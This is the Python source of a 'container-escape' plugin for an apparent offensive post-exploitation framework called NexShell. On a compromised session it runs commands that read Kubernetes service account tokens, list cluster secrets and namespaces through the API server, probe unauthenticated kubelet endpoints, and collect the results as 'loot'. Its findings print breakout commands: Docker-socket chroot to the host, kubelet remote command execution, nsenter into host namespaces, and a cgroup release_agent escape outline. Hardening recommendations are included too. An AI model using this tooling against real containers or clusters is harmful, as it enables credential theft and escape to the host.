#!/usr/bin/env python3
"""
NexShell Plugin — Container Escape  (plugins/container_escape.py)
Detect and exploit container security misconfigurations.

Coverage:
  - Environment detection (Docker/Podman/containerd/LXC/K8s)
  - Privileged container detection
  - Docker socket exposure (trivial escape)
  - Dangerous Linux capabilities in containers
  - Writable /proc/sysrq-trigger
  - cgroup v1 release_agent escape
  - Namespace analysis (user/pid/net/mnt)
  - Mounted host paths (/) overlay detection
  - Container runtime breakout paths
  - K8s pod security context misconfigurations
  - Kubernetes API server reachability
  - Service account token privileges
  - Exposed kubelet API (10250)
  - CVE-2024-21626 (runc working directory escape)
  - CVE-2019-5736 (runc exec overwrite)
  - CVE-2020-15257 (Containerd shim API)

Usage:
    (NexShell)> plugins run container-escape
    (NexShell)> plugins run container-escape --check-only
"""

import re
from core.plugin import NexPlugin


class ContainerEscape(NexPlugin):
    name        = "container-escape"
    description = "Container/K8s security — privileged/caps/socket/cgroup/namespace escapes"
    author      = "vulnquest58"
    version     = "1.0"
    platform    = "linux"
    category    = "privesc"
    mitre_id    = "T1611"

    CHECKS = [
        # ── Environment detection ────────────────────────────────────────────
        ("ls -la /.dockerenv 2>/dev/null",
         "dockerenv", "Docker Env File (/.dockerenv)"),
        ("cat /proc/1/cgroup",
         "cgroup_info", "Cgroup Info (container check)"),
        ("cat /proc/self/cgroup",
         "self_cgroup", "Self Cgroup"),
        ("cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'container|kubernetes|docker|podman'",
         "container_env_vars", "Container Environment Variables"),
        ("env | grep -iE 'KUBERNETES|DOCKER|CONTAINER|POD_NAME|HOSTNAME'",
         "k8s_env", "K8s/Docker Environment Variables"),
        ("cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null",
         "k8s_token", "K8s ServiceAccount Token"),

        # ── Runtime version (CVE checks) ─────────────────────────────────────
        ("runc --version 2>/dev/null",
         "runc_version", "runc Version (CVE-2024-21626/2019-5736)"),
        ("containerd --version 2>/dev/null",
         "containerd_version", "containerd Version (CVE-2020-15257)"),
        ("docker version 2>/dev/null | head -5",
         "docker_version", "Docker Version"),

        # ── Privileged / Capabilities ─────────────────────────────────────────
        ("cat /proc/self/status | grep CapEff",
         "cap_effective", "Effective Capabilities (CapEff)"),
        ("cat /proc/self/status | grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)'",
         "all_caps", "All Capabilities"),
        ("capsh --decode=$(cat /proc/self/status | grep CapEff | awk '{print $2}') 2>/dev/null",
         "cap_decode", "Decoded Capabilities"),
        ("cat /proc/self/status | grep -i 'NoNewPrivs'",
         "no_new_privs", "NoNewPrivileges Flag"),

        # ── Filesystem mounts (host path detection) ──────────────────────────
        ("cat /proc/mounts",
         "proc_mounts", "Mounted Filesystems"),
        ("findmnt 2>/dev/null",
         "findmnt", "Mount Tree"),
        ("ls -la / | head -20",
         "root_listing", "Root Filesystem (host mount check)"),
        ("ls -la /host 2>/dev/null",
         "host_dir", "/host Directory (mounted host /)"),
        ("ls -la /mnt 2>/dev/null",
         "mnt_dir", "/mnt Directory"),

        # ── Docker socket ─────────────────────────────────────────────────────
        ("ls -la /var/run/docker.sock /run/docker.sock 2>/dev/null",
         "docker_sock", "Docker Socket"),
        ("ls -la /var/run/docker/libcontainerd/docker-containerd.sock 2>/dev/null",
         "containerd_sock", "containerd Socket"),
        ("ls -la /run/containerd/containerd.sock 2>/dev/null",
         "containerd_sock2", "containerd Socket (alt)"),
        ("ls -la /run/podman/podman.sock 2>/dev/null",
         "podman_sock", "Podman Socket"),

        # ── cgroup release_agent escape ───────────────────────────────────────
        ("ls -la /sys/fs/cgroup/ 2>/dev/null | head -10",
         "cgroup_v1", "cgroup v1 Filesystem"),
        ("cat /sys/fs/cgroup/release_agent 2>/dev/null",
         "cgroup_release_agent", "cgroup release_agent"),
        ("ls -la /sys/fs/cgroup/memory/release_agent 2>/dev/null",
         "cgroup_memory_ra", "cgroup Memory release_agent"),
        ("ls -la /sys/fs/cgroup/cpu/release_agent 2>/dev/null",
         "cgroup_cpu_ra", "cgroup CPU release_agent"),

        # ── sysrq & kernel params ─────────────────────────────────────────────
        ("ls -la /proc/sysrq-trigger 2>/dev/null",
         "sysrq", "/proc/sysrq-trigger"),
        ("cat /proc/sys/kernel/core_pattern 2>/dev/null",
         "core_pattern", "core_pattern (CVE-2019-5736 indicator)"),

        # ── Namespace analysis ────────────────────────────────────────────────
        ("cat /proc/self/ns 2>/dev/null || ls -la /proc/self/ns/ 2>/dev/null",
         "namespaces", "Process Namespaces"),
        ("ls -la /proc/1/ns/ 2>/dev/null",
         "pid1_namespaces", "PID1 Namespaces (host check)"),
        ("unshare --user 2>/dev/null && echo 'user-ns-OK' || echo 'user-ns-denied'",
         "user_ns_test", "User Namespace Creation"),

        # ── Devices ───────────────────────────────────────────────────────────
        ("ls -la /dev/mem /dev/kmem 2>/dev/null",
         "raw_devices", "Raw Memory Devices"),
        ("ls -la /dev/sda /dev/nvme0n1 /dev/xvda 2>/dev/null",
         "block_devices", "Block Devices"),

        # ── K8s API access ────────────────────────────────────────────────────
        ("curl -sk https://kubernetes.default.svc/api 2>/dev/null | head -20",
         "k8s_api_anon", "K8s API Anonymous Access"),
        ("curl -sk -H 'Authorization: Bearer '$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null) https://kubernetes.default.svc/api/v1/namespaces 2>/dev/null | head -20",
         "k8s_namespaces", "K8s Namespaces (with SA token)"),
        ("curl -sk -H 'Authorization: Bearer '$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null) https://kubernetes.default.svc/api/v1/secrets 2>/dev/null | head -20",
         "k8s_secrets_api", "K8s Secrets (with SA token)"),
        ("kubectl auth can-i --list 2>/dev/null",
         "k8s_rbac", "K8s RBAC: Can-I List"),
        ("kubectl get pods --all-namespaces 2>/dev/null | head -20",
         "k8s_pods", "K8s Pods"),

        # ── Kubelet (unauthenticated 10250) ───────────────────────────────────
        ("curl -sk https://localhost:10250/pods 2>/dev/null | head -30",
         "kubelet_pods", "Kubelet /pods (unauthenticated)"),
        ("curl -sk https://localhost:10250/runningpods 2>/dev/null | head -20",
         "kubelet_running", "Kubelet /runningpods"),
        ("curl -sk http://localhost:10255/pods 2>/dev/null | head -20",
         "kubelet_ro", "Kubelet Read-Only API (10255)"),

        # ── Other container escape vectors ────────────────────────────────────
        ("cat /proc/self/mountinfo | grep 'overlay\\|upperdir'",
         "overlay_mounts", "Overlay Mounts (container layer)"),
        ("fdisk -l 2>/dev/null | head -20",
         "disk_list", "Disk List (host disk access)"),
        ("dmesg 2>/dev/null | head -10",
         "dmesg_access", "dmesg Access (CAP_SYS_ADMIN check)"),
    ]

    # Capability hex values that indicate privilege
    PRIVILEGED_CAPS = {
        0x0000003fffffffff: "FULLY PRIVILEGED (all caps)",
        0x000001ffffffffff: "HIGHLY PRIVILEGED",
    }

    DANGEROUS_CAPS = [
        ('cap_sys_admin',    'Critical', "CAP_SYS_ADMIN in Container",
         "CAP_SYS_ADMIN is a near-root capability. Multiple escape paths: mount host /, cgroup release_agent, overlay fs."),
        ('cap_sys_ptrace',   'High',     "CAP_SYS_PTRACE in Container",
         "CAP_SYS_PTRACE allows process injection into host processes if sharing PID namespace."),
        ('cap_dac_override', 'High',     "CAP_DAC_OVERRIDE in Container",
         "CAP_DAC_OVERRIDE bypasses file permission checks. May read/write host files if mounted."),
        ('cap_setuid',       'High',     "CAP_SETUID in Container",
         "CAP_SETUID allows switching to any UID. Can become root inside container."),
        ('cap_net_admin',    'Medium',   "CAP_NET_ADMIN in Container",
         "CAP_NET_ADMIN allows network interface manipulation. Can sniff traffic, ARP spoof."),
        ('cap_sys_module',   'Critical', "CAP_SYS_MODULE in Container",
         "CAP_SYS_MODULE allows loading kernel modules. Trivial host escape via malicious module."),
        ('cap_sys_rawio',    'High',     "CAP_SYS_RAWIO in Container",
         "CAP_SYS_RAWIO allows raw disk I/O. Can read/write host disk directly."),
    ]

    def run(self, session, args: list):
        check_only = '--check-only' in (args or [])
        self.info("Starting container-escape v1.0 ...")
        sections  = []
        collected = {}
        findings_created = 0

        # ── Collect data ──────────────────────────────────────────────────────
        for cmd, key, label in self.CHECKS:
            try:
                out = self._exec(session, cmd)
                if not out.strip():
                    continue
                collected[key] = out
                self.loot(out, category='privesc', source=f"container-escape:{key}")
                sections.append(f"\n  [{label}]")
                sections.append('─'*64)
                sections.append(out.strip()[:400])
            except Exception as e:
                self.warn(f"Check failed [{label}]: {e}")

        # ── Container detection ───────────────────────────────────────────────
        in_container = False
        container_type = "Unknown"

        if collected.get('dockerenv') or re.search(r'docker', collected.get('cgroup_info', ''), re.I):
            in_container   = True
            container_type = "Docker"
        if re.search(r'kubepods', collected.get('cgroup_info', ''), re.I):
            in_container   = True
            container_type = "Kubernetes"
        if re.search(r'lxc', collected.get('cgroup_info', ''), re.I):
            in_container   = True
            container_type = "LXC"

        if in_container:
            sections.insert(0, f"[!] Running INSIDE {container_type} container")
        else:
            sections.insert(0, "[*] Does not appear to be inside a container — running on host")

        # ── Capability analysis ───────────────────────────────────────────────
        cap_text = collected.get('cap_decode', '') or collected.get('all_caps', '')
        for cap, severity, title, recommendation in self.DANGEROUS_CAPS:
            if re.search(cap, cap_text, re.I):
                self.finding(
                    title          = title,
                    description    = f"Detected capability: {cap}\n\nCapability output:\n{cap_text[:300]}",
                    severity       = severity,
                    recommendation = recommendation,
                    mitre_id       = self.mitre_id,
                )
                self.emit('finding.created', severity=severity, title=title, plugin=self.name)
                findings_created += 1

        # Check for all-capabilities (privileged container)
        cap_eff_line = collected.get('cap_effective', '')
        cap_match = re.search(r'CapEff:\s*([0-9a-fA-F]+)', cap_eff_line)
        if cap_match:
            cap_val = int(cap_match.group(1), 16)
            if cap_val == 0x0000003fffffffff or cap_val >= 0x000001ffffffffff:
                self.finding(
                    title          = "Privileged Container Detected (All Capabilities)",
                    description    = f"CapEff: {hex(cap_val)} — container is running with all capabilities. Trivial host escape.",
                    severity       = "Critical",
                    recommendation = "Never run --privileged in production. Use specific capabilities with --cap-add. Apply Pod Security Standards (restricted profile).",
                    mitre_id       = self.mitre_id,
                )
                findings_created += 1

        # ── Docker socket ─────────────────────────────────────────────────────
        docker_sock = collected.get('docker_sock', '')
        if docker_sock.strip() and 'No such' not in docker_sock:
            self.finding(
                title          = "Docker Socket Mounted in Container",
                description    = f"Docker socket accessible from within container.\n{docker_sock}\n\nEscape: docker run -v /:/host --rm -it alpine chroot /host sh",
                severity       = "Critical",
                recommendation = "Never mount docker.sock into containers. If needed, use a socket proxy with restricted permissions.",
                mitre_id       = self.mitre_id,
            )
            findings_created += 1

        # ── cgroup v1 release_agent escape ────────────────────────────────────
        cg_ra = collected.get('cgroup_release_agent', '') or collected.get('cgroup_memory_ra', '')
        if cg_ra.strip():
            if in_container and re.search(r'cap_sys_admin', cap_text, re.I):
                self.finding(
                    title          = "cgroup v1 release_agent Escape Possible",
                    description    = "Container has CAP_SYS_ADMIN + cgroup v1 filesystem accessible.\n\nEscape: mount cgroup v1, write /exploit.sh to release_agent, trigger with memory.max_mem",
                    severity       = "Critical",
                    recommendation = "Use cgroup v2 (cgroupns). Remove CAP_SYS_ADMIN. Apply seccomp profile. Use Pod Security Standards (restricted).",
                    mitre_id       = self.mitre_id,
                )
                findings_created += 1

        # ── Host / disk device access ─────────────────────────────────────────
        if collected.get('block_devices', '').strip():
            self.finding(
                title          = "Block Devices Accessible from Container",
                description    = collected.get('block_devices', '')[:300],
                severity       = "Critical",
                recommendation = "Direct disk access allows reading/modifying host filesystem. Never expose /dev/sda or raw disks to containers.",
                mitre_id       = self.mitre_id,
            )
            findings_created += 1

        # ── Mounted host paths ────────────────────────────────────────────────
        mounts = collected.get('proc_mounts', '')
        if re.search(r'\s+/\s+.*rw', mounts):
            self.finding(
                title          = "Host Root Filesystem Mounted Read-Write",
                description    = "Host '/' mounted read-write into container. Full host filesystem access.",
                severity       = "Critical",
                recommendation = "Never mount host / into containers. If needed, use read-only (ro) mounts of specific directories.",
                mitre_id       = self.mitre_id,
            )
            findings_created += 1

        # ── K8s API anonymous access ──────────────────────────────────────────
        k8s_api = collected.get('k8s_api_anon', '')
        if '"versions"' in k8s_api or '"groups"' in k8s_api:
            self.finding(
                title          = "K8s API Server Anonymously Accessible",
                description    = k8s_api[:300],
                severity       = "High",
                recommendation = "Disable anonymous authentication: --anonymous-auth=false in kube-apiserver flags.",
                mitre_id       = "T1613",
            )
            findings_created += 1

        # ── Kubelet unauthenticated ────────────────────────────────────────────
        if collected.get('kubelet_pods', '').strip() and 'Connection refused' not in collected.get('kubelet_pods', ''):
            self.finding(
                title          = "Kubelet API Unauthenticated (Port 10250)",
                description    = "Kubelet /pods endpoint accessible without authentication.\n\nExploit: curl -sk https://node:10250/run/<ns>/<pod>/<container> -d 'cmd=id'",
                severity       = "Critical",
                recommendation = "Enable kubelet authentication: --authentication-token-webhook=true and --authorization-mode=Webhook. Firewall port 10250.",
                mitre_id       = "T1613",
            )
            findings_created += 1

        # ── runc CVE checks ───────────────────────────────────────────────────
        runc_ver = collected.get('runc_version', '')
        # CVE-2024-21626: runc < 1.1.12
        runc_match = re.search(r'runc version (\d+)\.(\d+)\.(\d+)', runc_ver)
        if runc_match:
            major, minor, patch_v = int(runc_match.group(1)), int(runc_match.group(2)), int(runc_match.group(3))
            if (major, minor, patch_v) < (1, 1, 12):
                self.finding(
                    title          = f"Vulnerable runc Version: {runc_ver.strip()} (CVE-2024-21626)",
                    description    = "runc < 1.1.12 is vulnerable to CVE-2024-21626 (Leaky Vessels). Working directory escape from container to host.",
                    severity       = "Critical",
                    recommendation = "Upgrade runc to >= 1.1.12. Apply CVE-2024-21626 patches.",
                    mitre_id       = self.mitre_id,
                )
                findings_created += 1

        # ── Escape path summary ───────────────────────────────────────────────
        escape_paths = []
        if collected.get('docker_sock', '').strip() and 'No such' not in collected.get('docker_sock', ''):
            escape_paths.append("Docker socket → docker run -v /:/host → chroot /host")
        if re.search(r'cap_sys_admin', cap_text, re.I) and cg_ra.strip():
            escape_paths.append("CAP_SYS_ADMIN + cgroup v1 → release_agent write → host command execution")
        if collected.get('block_devices', '').strip():
            escape_paths.append("Block device access → mount host disk → read/write host files")
        if re.search(r'cap_sys_module', cap_text, re.I):
            escape_paths.append("CAP_SYS_MODULE → load malicious kernel module → root on host")
        if cap_match and int(cap_match.group(1), 16) >= 0x000001ffffffffff:
            escape_paths.append("Privileged container → nsenter --target 1 --mount --uts --ipc --net --pid → host namespace")

        if escape_paths:
            sections.append(f"\n{'═'*64}")
            sections.append("  [!] Container Escape Paths:")
            for path in escape_paths:
                sections.append(f"  ► {path}")

        self.info(f"container-escape complete — {findings_created} findings, {len(escape_paths)} escape paths.")
        return '\n'.join(sections) if sections else "No container data collected."

    @staticmethod
    def _exec(session, cmd: str) -> str:
        for method in ('exec', 'run', 'execute', 'send_command'):
            fn = getattr(session, method, None)
            if callable(fn):
                result = fn(cmd)
                if isinstance(result, bytes):
                    return result.decode(errors='replace')
                if isinstance(result, str):
                    return result
        return ''
